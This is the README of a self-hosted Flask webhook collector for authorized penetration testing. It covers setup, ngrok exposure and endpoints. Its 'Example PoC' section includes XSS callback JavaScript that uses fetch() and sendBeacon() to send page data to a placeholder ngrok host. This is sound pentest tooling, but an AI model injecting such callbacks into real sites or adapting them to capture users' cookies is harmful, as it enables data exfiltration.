# CalloHook

A simple self-hosted webhook collector built with **Flask** for authorized penetration testing and security research.

It captures incoming HTTP requests and displays useful information such as:

* HTTP method & path
* Source IP
* Query parameters / `URLSearchParams`
* Cookies
* Headers
* Request body
* JSON payload
* Timestamp

It can also be exposed publicly using **ngrok**, useful for callback-based PoC testing and pentest documentation.

> **Disclaimer:** Use this tool only on systems you own or have explicit permission to test.

## Project Structure

```text
CalloHook/
├── main.py
├── requirements.txt
├── README.md
├── .gitignore
├── logs/
│   └── requests.jsonl
└── templates/
    └── index.html
```

## Installation

Clone the repository:

```bash
git clone https://github.com/nopedawn/CalloHook.git
cd CalloHook
```

Install dependencies:

```bash
pip install -r requirements.txt
```

## Usage

Start the webhook server:

```bash
python3 main.py
```

By default:

```text
Dashboard : http://127.0.0.1:8080
Logs      : http://127.0.0.1:8080/logs
```

Test it with:

```bash
curl "http://127.0.0.1:8080/poc?proof=test&source=pentest"
```

Or send JSON:

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"finding":"Stored XSS","status":"confirmed"}' \
  "http://127.0.0.1:8080/poc"
```

## Using ngrok

Start the collector first:

```bash
python3 main.py
```

Then open another terminal:

```bash
ngrok http 8080
```

ngrok will provide a public URL similar to:

```text
https://example.ngrok-free.app
```

And provide Web Interface at:

```text
http://127.0.0.1:4040
```

Test the public endpoint:

```bash
curl "https://example.ngrok-free.app/poc?proof=test"
```

The request will appear in the local dashboard.

## Example PoC

<details>
  <summary>Maximize this</summary>
  <br>
For authorized XSS testing, non-sensitive callback information can be sent using `URLSearchParams`:

```javascript
const params = new URLSearchParams({
    proof: "xss-executed",
    origin: location.origin,
    path: location.pathname
});

fetch(
    "https://example.ngrok-free.app/poc?" + params.toString(),
    { mode: "no-cors" }
);
```

Or using `sendBeacon()`:

```javascript
navigator.sendBeacon(
    "https://example.ngrok-free.app/poc?proof=xss-executed"
);
```

This can provide callback evidence for a penetration testing report without collecting sensitive user data.

</details>

## Endpoints

| Endpoint  | Method | Description         |
| --------- | ------ | ------------------- |
| `/`       | `GET`  | Web dashboard       |
| `/<path>` | Any    | Receive callbacks   |
| `/logs`   | `GET`  | View logs as JSON   |
| `/clear`  | `POST` | Clear captured logs |

## Notes

Captured requests are automatically stored in:

```text
logs/requests.jsonl
```

Logs will persist after the server restarts and are automatically loaded back into the dashboard when the application starts.

To clear all captured logs, use the **Clear Logs** button on the dashboard or send:

```bash
curl -X POST http://127.0.0.1:8080/clear
```

The `logs/` directory is excluded from Git using `.gitignore` to prevent captured pentest data from being accidentally committed to the repository.

For pentest environments, avoid collecting real credentials, authentication tokens, or session cookies belonging to actual users. Use dedicated test accounts and test data whenever possible.

## License

MIT License

## Author

Developed by [nopedawn](https://github.com/nopedawn) for authorized penetration testing and security research.